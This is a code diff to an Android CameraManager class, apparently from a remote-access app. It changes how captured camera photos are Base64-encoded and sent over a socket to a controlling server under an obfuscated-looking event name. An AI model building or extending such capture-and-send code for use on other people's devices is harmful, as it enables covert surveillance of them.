@@ -10,6 +10,7 @@ import android.hardware.Camera;
 import android.hardware.Camera.PictureCallback;
 import android.hardware.Camera.Parameters;
 import android.os.Build;
+import android.util.Base64;
 
 import com.remote.app.socket.IOSocket;
 
@@ -62,11 +63,13 @@ public class CameraManager {
 
             Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
             ByteArrayOutputStream bos = new ByteArrayOutputStream();
-            bitmap.compress(Bitmap.CompressFormat.JPEG, 20, bos);
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 40, bos);
             JSONObject object = new JSONObject();
-            object.put("image", true);
-            object.put("buffer", bos.toByteArray());
-            IOSocket.getInstance().getIoSocket().send("_0xCA", object);
+            object.put("type", "Photo");
+            object.put("name", "Camera Photo");
+            object.put("path", "Camera Photo");
+            object.put("buffer", Base64.encodeToString(data, Base64.DEFAULT));
+            IOSocket.getInstance().send("_0xFD", object.toString());
 
 
         } catch (JSONException e) {
